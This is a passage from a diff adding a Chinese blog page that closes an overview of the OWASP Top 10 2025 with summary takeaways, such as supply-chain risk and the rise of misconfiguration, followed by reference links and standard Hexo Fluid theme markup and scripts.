+<li><strong>供应链安全站上 C 位</strong>：A03 的爆炸半径概念深入人心。一个三方依赖的 0day 可以同时打穿上千个应用。</li>
+<li><strong>配置问题被严重低估了</strong>：A02 跃升至 #2，100% 的应用都有配置问题，自动化配置审计不再是可选项。</li>
+<li><strong>异常路径成为新的攻击面</strong>：A10 的上榜说明攻击者越来越擅长寻找正常功能的”边界”和”边缘情况”。</li>
+<li><strong>传统 Web 问题在减少但未消失</strong>：注入、认证失效等传统问题排名虽然下降，但在缺乏安全框架的遗留系统中仍然遍地都是。</li>
+<li><strong>根本原因分类法更成熟</strong>：SSRF 归入 A01、XXE 归入 A02，体现了工程思维的进步。</li>
+</ol>
+<hr>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/Top10/2025/0x00_2025-Introduction/">https://owasp.org/Top10/2025/0x00_2025-Introduction/</a></p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/">https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/</a></p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/">https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.invicti.com/blog/web-security/owasp-top-10">https://www.invicti.com/blog/web-security/owasp-top-10</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.metacompliance.com/blog/cyber-security-awareness/owasp-top-10-2025-released-what-you-need-to-know">https://www.metacompliance.com/blog/cyber-security-awareness/owasp-top-10-2025-released-what-you-need-to-know</a></p>
+<p><a target="_blank" rel="noopener" href="https://securityboulevard.com/2025/11/owasp-top-10-2025-updates-supply-chain-secrets-and-misconfigurations-take-center-stage/">https://securityboulevard.com/2025/11/owasp-top-10-2025-updates-supply-chain-secrets-and-misconfigurations-take-center-stage/</a></p>
+<p><a target="_blank" rel="noopener" href="https://sdtimes.com/security/owasp-top-10-updated-after-four-years-with-many-of-the-same-concerns-still-impacting-applications/">https://sdtimes.com/security/owasp-top-10-updated-after-four-years-with-many-of-the-same-concerns-still-impacting-applications/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.qualys.com/qualys-insights/2026/06/15/what-changed-in-owasp-top-10-2025-and-recommendations-for-each-category">https://blog.qualys.com/qualys-insights/2026/06/15/what-changed-in-owasp-top-10-2025-and-recommendations-for-each-category</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.twcert.org.tw/newepaper/cp-65-10556-3db82-3.html">https://www.twcert.org.tw/newepaper/cp-65-10556-3db82-3.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" class="category-chain-item">WEB安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WEB%E5%AE%89%E5%85%A8/" class="print-no-link">#WEB安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>OWASP TOP 10 2025 详细解析</div>
+      <div>http://example.com/2026/07/08/OWASP-TOP-10-2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/05/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACJDKJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Jackson%E9%93%BE/" title="从零开始的高版本JDKJava反序列化学习——Jackson链">
+                        <span class="hidden-mobile">从零开始的高版本JDKJava反序列化学习——Jackson链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
